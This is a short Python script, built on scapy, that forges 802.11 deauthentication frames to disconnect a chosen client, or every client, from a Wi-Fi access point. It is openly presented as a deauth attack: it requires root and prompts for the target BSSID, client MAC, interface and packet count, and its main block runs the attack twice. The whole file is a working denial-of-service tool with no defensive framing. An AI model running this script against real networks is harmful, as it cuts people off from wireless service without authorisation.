from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

def deauth_attack(target_bssid, client_mac, interface="wlan0", count=100):
    import os, sys
    print(f"[INFO] Preparing deauth attack on {interface}")
    if os.geteuid() != 0:
        print("[ERROR] This attack requires root privileges (sudo).")
        print("Run with sudo: sudo python3 main.py")
        sys.exit(1)
    print(f"[INFO] Sending {count} deauth packets on {interface} from {target_bssid} to {client_mac}...")
    pkt = RadioTap() / Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()
    sendp(pkt, iface=interface, count=count, inter=0.1, verbose=1)
    print("[INFO] Deauth attack finished.")

def select_bssid_from_list(bssid_list):
    print("[INFO] Selecting a saved BSSID...")
    if not bssid_list:
        print("No saved BSSID.")
        return None
    print("Select a BSSID:")
    for idx, entry in enumerate(bssid_list):
        print(f"{idx+1}. {entry['bssid'][:17]} - {entry['ssid']}")
    choice = input("BSSID number to use (or enter to cancel): ")
    if not choice.isdigit() or not (1 <= int(choice) <= len(bssid_list)):
        print("Cancelled.")
        return None
    return bssid_list[int(choice)-1]['bssid'][:17]

if __name__ == "__main__":
    bssid = input("Hotspot BSSID: ")
    client = input("Client MAC Adress (ou ff:ff:ff:ff:ff:ff pour tous) : ")
    iface = input("Wi-Fi interfave (ex: wlan0mon) : ") or "wlan0mon"
    count = input("Number of request [100] : ") or "100"
    deauth_attack(bssid, client, iface, int(count))
    count = input("Number of request [100] : ") or "100"
    deauth_attack(bssid, client, iface, int(count))
